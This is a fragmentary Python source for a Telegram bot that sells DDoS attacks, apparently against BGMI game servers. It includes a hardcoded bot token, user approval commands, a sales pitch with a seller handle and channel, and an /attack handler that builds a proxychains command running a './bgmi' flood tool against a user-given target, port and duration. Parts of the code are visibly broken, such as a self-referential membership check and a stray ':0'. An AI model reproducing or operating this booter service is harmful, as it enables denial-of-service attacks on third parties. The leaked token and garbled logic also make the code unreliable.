...
bot = telebot.TeleBot('6853657954:AAGTaCptQDfuuBs-fsHKUAT2tAaYyZnN-0g')
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in user_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:0
            response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐨𝐧 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧.\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝟐 𝐌𝐢𝐧𝐮𝐭𝐞𝐬 𝐛𝐞𝐟𝐨𝐫𝐞 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐭𝐡𝐞 /attack 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐚𝐠𝐚𝐢𝐧"
            bot.reply_to(message, response)
            return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 600:
                ...
                if proxy:
                    full_command = f"proxychains4 -q ./bgmi {target} {port} {time} 150"
...
🛒 𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 :-\n𝟏.@Shubh4071
🏫𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :- https://t.me/Endeavour112
'''
...
𝟑. 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝 @Endeavour112 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐖𝐨𝐫𝐤.
...
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐎𝐟𝐟𝐞𝐫'𝐬 𝐋𝐢𝐬𝐭𝐞𝐝 𝐁𝐞𝐥𝐨𝐰 :
𝐃𝐞𝐚𝐫 {user_name}  𝐖𝐞 𝐇𝐚𝐯𝐞 𝐎𝐧𝐥𝐲 𝟏 𝐏𝐥𝐚𝐧 𝐀𝐧𝐝 𝐓𝐡𝐚𝐭 𝐈𝐬 𝐏𝐨𝐰𝐞𝐫𝐟𝐮𝐥𝐥 𝐓𝐡𝐞𝐧 𝐀𝐧𝐲 𝐎𝐭𝐡𝐞𝐫 𝐃𝐃𝐨𝐒 𝐓𝐡𝐚𝐭 𝐈𝐬 𝐃𝐃𝐨𝐒 !!!

💎 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 :
-> 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞 : 𝟏𝟎𝟎𝟎 (𝐒)
> 𝐀𝐟𝐭𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐢𝐦𝐢𝐭 : 𝟎 𝐬𝐞𝐜
-> 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐬 𝐀𝐭𝐭𝐚𝐜𝐤 : 𝟓𝟎𝟎
> 𝐖𝐨𝐫𝐤𝐢𝐧𝐠 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 : 𝟏𝟎/𝟏𝟎
-> 𝐅𝐮𝐥𝐥 𝐒𝐚𝐟𝐞 𝐍𝐨 𝐁𝐚𝐧 𝐈𝐬𝐬𝐮𝐞
...
➕🧒/approve <𝐮𝐬𝐞𝐫𝐈𝐝> <𝐭𝐢𝐦𝐞>: 𝐀𝐝𝐝 𝐚 𝐔𝐬𝐞𝐫.
➖🧒/dispprove <𝐮𝐬𝐞𝐫𝐢𝐝> 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚 𝐔𝐬𝐞𝐫
...
📽️ /video : 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 𝐃𝐃𝐨𝐒𝐒𝐞𝐑.
